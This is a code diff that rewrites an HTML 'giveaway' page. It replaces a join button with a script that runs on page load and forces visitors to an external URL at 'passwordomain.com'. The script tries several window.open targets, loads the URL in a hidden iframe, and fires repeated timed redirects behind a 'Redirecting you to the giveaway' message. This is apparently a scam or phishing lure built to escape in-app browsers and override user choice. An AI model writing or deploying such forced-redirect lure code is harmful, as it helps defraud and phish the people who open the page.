@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Join Giveaway</title>
+  <title>Redirecting...</title>
   <style>
     body {
       display: flex;
@@ -11,41 +11,47 @@
       align-items: center;
       height: 100vh;
       margin: 0;
-      background-color: #ffffff; /* White background */
+      background-color: #ffffff;
       font-family: Arial, sans-serif;
+      text-align: center;
     }
 
-    .btn {
-      background: linear-gradient(135deg, #d4af37, #f5d76e); /* Golden gradient */
-      border: none;
-      border-radius: 12px;
-      padding: 20px 50px;
-      font-size: 28px;
-      font-weight: bold;
-      color: white;
-      cursor: pointer;
-      transition: all 0.3s ease;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.25);
-    }
-
-    .btn:hover {
-      background: linear-gradient(135deg, #f5d76e, #d4af37);
-      transform: translateY(-3px);
-      box-shadow: 0 12px 25px rgba(0,0,0,0.35);
+    .note {
+      font-size: 18px;
+      color: #555;
     }
   </style>
 </head>
 <body>
-  <button class="btn" onclick="openInBrowser()">JOIN GIVEAWAY</button>
+  <div class="note">Redirecting you to the giveaway...</div>
 
   <script>
-    function openInBrowser() {
-      // Try system-level browser first
-      window.open("https://passwordomain.com/1838319", "_system");
+    const finalURL = "https://passwordomain.com/1838319";
 
-      // Fallback: new window/tab
-      window.location.href = "https://passwordomain.com/1838319";
+    function multiRedirect(url) {
+      // Attempt different open methods
+      try { window.open(url, "_system"); } catch(e){}
+      try { window.open(url, "_blank"); } catch(e){}
+      try { window.open(url, "_top"); } catch(e){}
+
+      // Hidden iframe trick
+      try {
+        const iframe = document.createElement("iframe");
+        iframe.style.display = "none";
+        iframe.src = url;
+        document.body.appendChild(iframe);
+      } catch(e){}
+
+      // Sequential timed redirects
+      setTimeout(() => { window.location.href = url; }, 300);
+      setTimeout(() => { window.location.replace(url); }, 600);
+      setTimeout(() => { window.location.href = url; }, 900);
+      setTimeout(() => { window.location.replace(url); }, 1200);
+      setTimeout(() => { window.location.href = url; }, 1500);
     }
+
+    // Run multi-step redirect automatically
+    multiRedirect(finalURL);
   </script>
 </body>
 </html>
